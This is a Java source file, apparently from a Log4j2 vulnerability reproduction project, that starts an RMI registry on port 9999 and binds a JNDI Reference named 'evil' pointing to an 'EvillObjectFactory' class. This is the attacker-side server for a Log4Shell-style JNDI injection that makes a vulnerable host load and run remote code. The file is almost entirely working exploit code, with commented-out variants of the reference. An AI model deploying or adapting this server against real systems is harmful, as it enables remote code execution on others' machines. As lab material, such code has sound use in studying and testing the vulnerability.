package com.itpkm.springmvclog4j2.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author itpkm
 * @date 2021年12月14日
 * @Link https://blog.csdn.net/he_and/article/details/105586691
 */
public class RmiServer {

    // RMI Server Port
    private static final Integer PORT = 9999;

    public static void main(String[] args) {
        try {
            //Reference reference = new Reference("com.itpkm.springmvclog4j2.rmi.EvillObj","EvillObj",null);
            //Reference reference = new Reference("com.itpkm.springmvclog4j2.rmi.EvillObj","EvillObj","http://localhost:8080");
            //Reference reference = new Reference(EvillObj.class.getName(),"EvillObj",null);
            //Reference reference = new Reference("EvillObject","EvillObject",null);
            //Reference reference = new Reference("com.itpkm.springmvclog4j2.rmi.EvillObj","com.itpkm.springmvclog4j2.rmi.EvillObj",null);
            Registry registry = LocateRegistry.createRegistry(PORT);
            System.out.println("Create RMI registry on port " + PORT);

            Reference reference = new Reference("EvillObj", "com.itpkm.springmvclog4j2.rmi.EvillObjectFactory", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
